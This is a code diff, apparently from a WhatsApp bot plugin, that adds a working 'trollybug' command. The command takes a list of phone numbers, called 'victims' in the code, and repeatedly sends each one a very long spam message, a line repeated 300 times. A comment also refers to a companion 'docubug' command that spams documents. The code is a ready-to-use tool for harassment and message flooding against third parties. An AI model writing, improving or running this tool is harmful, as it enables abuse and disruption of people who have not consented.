@@ -372,10 +372,39 @@ cmd({
   filename: __filename,
 }, async (conn, zk, m, { arg, superUser, repondre, prefixe }) => {
   if (!superUser) return await repondre(mess.prem);
-  if (!arg[0] || !arg.join(" ").includes("|")) return await repondre(`Use ${prefixe}trollybug amount|number1,number2,...`);
+  if (!arg[0] || !arg.join(" ").includes("|")) {
+    return await repondre(`Use ${prefixe}trollybug amount|number1,number2,...`);
+  }
 
   const [amountStr, numsStr] = arg.join(" ").split("|").map(s => s.trim());
-  if (!amountStr || !numsStr) return await repondre(`Wrong format. Use: ${prefixe}trollybug amount|number1,number2
+  if (!amountStr || !numsStr) {
+    return await repondre(`Wrong format. Use: ${prefixe}trollybug amount|number1,number2,...`);
+  }
+
+  const amount = parseInt(amountStr);
+  if (isNaN(amount) || amount < 1) {
+    return await repondre("Invalid amount");
+  }
+
+  const victims = parseVictims(numsStr);
+  const spamMsg = "🧻 Dawens Scroll Spam 🧻\n".repeat(300);
+
+  for (const victimNum of victims) {
+    const victim = victimNum + "@s.whatsapp.net";
+    for (let i = 0; i < amount; i++) {
+      try {
+        await zk.sendMessage(victim, { text: spamMsg });
+        await delay(1000);
+      } catch (e) {
+        await repondre(`Error sending to ${victimNum}: ${e.message}`);
+        break;
+      }
+    }
+  }
+
+  await react(m.chat, zk, m, "✅");
+  await repondre(`Sent trollybug x${amount} to:\n${victims.join(", ")}`);
+});
 
 // docubug (send document spam to numbers)
 cmd({
